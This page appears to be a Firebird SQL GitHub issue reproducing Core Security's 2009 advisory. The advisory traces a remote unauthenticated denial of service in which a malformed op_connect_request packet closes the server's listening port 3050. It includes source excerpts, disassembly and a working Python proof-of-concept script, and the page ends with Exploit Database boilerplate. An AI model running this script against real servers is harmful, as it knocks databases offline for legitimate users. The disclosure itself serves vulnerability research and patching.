## Description

[![@firebird-automations](https://avatars.githubusercontent.com/u/74513536?u=7c459bdbf23c25ca946da24ff546fd89d39eb817&v=4&size=48)](/firebird-automations)[firebird-automations](https://github.com/firebird-automations)opened [on Jul 20, 2009](https://github.com/FirebirdSQL/firebird/issues/2973#issue-866882103)

Submitted by: [@dyemanov](https://github.com/dyemanov)

It's possible to shutdown the server's main port (3050 by default) via sending a malformed packet of some special format, thus causing a DoS condition for new incoming connections. This exploit can be used by an unauthenticated client. Reported 15-Jul-2009 by Core Security Technologies.

from Core Security Technologies.

8. *Technical Description / Proof of Concept Code*

8.1. *Introduction*

Firebird SQL is an open source relational database management system
offering many ANSI SQL standard features that runs on Linux, Windows and
a variety of Unix platforms.

A remote denial of service can be triggered by an unauthenticated
attacker, by sending an unexpected 'op_connect_request' message with
invalid data of length greater than or equal to 12 bytes to the server.

Inside the server ('src/remote/server.cpp'), the function
'process_packet2()' processes a packet received from a client. This
function has a 'switch' statement that considers all the possible
opcodes defined in the protocol (see 'P_OP' enum 'in
src/remote/protocol.h').

/-----------

src/remote/server.cpp:

...
3404	P_OP op = receive->p_operation;
3405	switch (op)
3406	{
3407	case op_connect:
	...
3426	case op_compile:
	...
3430	case op_attach:
	...

- -----------/

 In the case of an 'op_connect_request' packet, the execution flow goes
to the following 'case' in the 'switch' statement:

/-----------

src/remote/server.cpp:

...
3584	case op_connect_request:
3585		aux_request(port, &receive->p_req, sendL);
3586		break;

- -----------/

 After calling 'aux_request()' function and executing the 'break'
statement, execution lands here:

/-----------

src/remote/server.cpp:

...
3652	if (port && port->port_state == state_broken) {
3653		if (!port->port_parent) {
3654			gds__log("SERVER/process_packet: broken port, server exiting");
3655			port->disconnect(sendL, receive);
3656			ThreadData::restoreSpecific();
3657			return false;
3658		}
3659		port->disconnect(sendL, receive);
3660		port = NULL;
3661	}

- -----------/

 By debugging the 'fbserver.exe' binary when it receives an
'op_connect_request' packet, we can see that the conditions of the first
'if' statement are satisfied, but the condition of the second 'if' is
not, so execution flow goes to the 'port->disconnect()' call:

/-----------

005ACE2C  |>  837E 0C 03           CMP DWORD PTR DS:[ESI+C],3
    ;port->port_state == state_broken ?
005ACE30  |.  75 1B                JNZ SHORT fbserver.005ACE4D
005ACE32  |.  837E 1C 00           CMP DWORD PTR DS:[ESI+1C],0
    ;port->port_parent == 0?
005ACE36  |.  75 0A                JNZ SHORT fbserver.005ACE42
    ;this conditional jump is taken
005ACE38  |.  68 D4D65F00          PUSH fbserver.005FD6D4
    ;  ASCII "SERVER/process_packet: broken port, server exiting"
005ACE3D  |.^ E9 44FDFFFF          JMP fbserver.005ACB86
005ACE42  |>  53                   PUSH EBX
    ; /Arg2
005ACE43  |.  57                   PUSH EDI
    ; |Arg1
005ACE44  |.  8BCE                 MOV ECX,ESI
    ; |
005ACE46  |.  E8 65D7FFFF          CALL <fbserver.rem_port::disconnect>
    ; \port->disconnect(sendL, receive)

- -----------/

 The type of 'port' is 'struct rem_port', as defined in
'src/remote/remote.h'. This struct type has a 'disconnect()' function
that is implemented in 'src/remote/server.cpp':

/-----------

src/remote/server.cpp:

1464	void rem_port::disconnect(PACKET* sendL, PACKET* receiveL)

- -----------/

 Inside this function, the following code is executed, in order to free
both the sent and received packets and to close the corresponding sockets:

/-----------

src/remote/server.cpp:

...
1492	REMOTE_free_packet(this, sendL);
1493	REMOTE_free_packet(this, receiveL);
1494	this->disconnect();

- -----------/

 That call to 'this->disconnect()' will ultimately lead to the
'disconnect()' function in 'src/remote/inet.cpp'. This function is
intended to break a remote connection, and receives a 'rem_port'
structure as parameter.

/-----------

src/remote/inet.cpp:

1731	static void disconnect( rem_port* port)
1732	{

- -----------/

 In the first place, the function closes the connection established by
the client, by calling the 'shutdown' function:

/-----------

src/remote/inet.cpp:

...
1763	if (port->port_handle && (SOCKET) port->port_handle !=
INVALID_SOCKET) {
1764		shutdown((int) port->port_handle, 2);
1765	}

- -----------/

 After that, as a comment line states, if the current 'rem_port'
structure being disconnected is a child of another 'rem_port' structure,
it recursively calls 'disconnect()' to disconnect the 'rem_port' stored
at 'port->port_async'. 'port_async' is a member of 'rem_port' struct
that describes an asynchronous sibling port.

/-----------

src/remote/inet.cpp:

/* If this is a sub-port, unlink it from it's parent */
...
1789	rem_port* parent = port->port_parent;
1790	if (parent != NULL) {
1791		if (port->port_async) {
1792			disconnect(port->port_async);
1793			port->port_async = NULL;
1794		}

- -----------/

 But when that recursive call to 'disconnect()' is made, the
'port->port_async' passed as parameter to be disconnected corresponds to
the main server socket, that is, the socket listening for incoming
connections on port 3050/TCP. Once in the recursive call, 'shutdown()'
and 'closesocket()' functions are invoked, making the server to stop
listening on the default port 3050/TCP, thus denying the service to
legitimate users.

8.2. *Remarks*

As a side effect, the 'fbserver.exe' process will enter an infinite
loop, consuming 100% CPU time.

On Windows platform, in a default installation, Firebird SQL server is
installed as a Windows service, and another service (the Firebird
Guardian) runs together with the server, in order to automatically
restart the 'fbserver.exe' process if it crashes or stops running
abnormally. However, in this case the Firebird Guardian is unable to
detect the denial of service condition, because the server does not
crash nor stops running.

In Firebird SQL 1.5.5 the behavior is different; the server will crash
inside the 'aux_request()' function in 'src/remote/server.cpp' due to a
null pointer dereference, instead of silently shutting down its listener
port. The problem arises when 'port->port_context' (which has a 'NULL'
value at this point) is loaded into 'rdb' variable and then, at line
'885', it is used as a pointer without properly checking that it points
to a valid memory address:

/-----------

src/remote/server.cpp:

...
884		rdb = port->port_context;
885		port->send_response(send, rdb->rdb_id,
886				send->p_resp.p_resp_data.cstr_length, status_vector);

- -----------/

8.3. *Proof of concept*

The following Python script will trigger the denial of service condition
on Firebird SQL, by sending an 'op_connect_request' packet with invalid
data of length greater than or equal to 12 bytes.

/-----------

import socket
import time

def attack(host, port):
    op_connect_request = '\x35'     # Request to establish connection

    packet  = '\x00\x00\x00' + op_connect_request
    packet += "A" * 12              #Invalid data, must be >= 12 bytes
in order to trigger the DoS

    print "(+) Connecting to the server...."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print "(+) Sending op_connect_request packet..."
    s.send(str(packet))
    s.close()
    print "(+) op_connect_request packet successfully sent."

    #Wait 10 seconds and try to connect again to Firebird SQL server, to
check if it's down
    print "(+) Waiting 10 seconds before trying to reconnect to the
server..."
    time.sleep(10)

    try:
        print "(+) Trying to reconnect..."
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.close()
        print "(!) Something went wrong. The server is still alive."
    except socket.error:
        print "(*) Attack successful. The server is down."

port = 3050
host = '192.168.131.128'            #Replace with your target host
attack(host, port)

##### About The Exploit Database

Ã

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as âGoogle Hackingâ was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnnyâs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term âGoogledorkâ to refer
to âa foolish or inept person as revealed by Googleâ. This was meant to draw attention to
the fact that this was not a âGoogle problemâ but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term âdorkâ became shorthand for a search query that located sensitive
information and âdorksâ were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
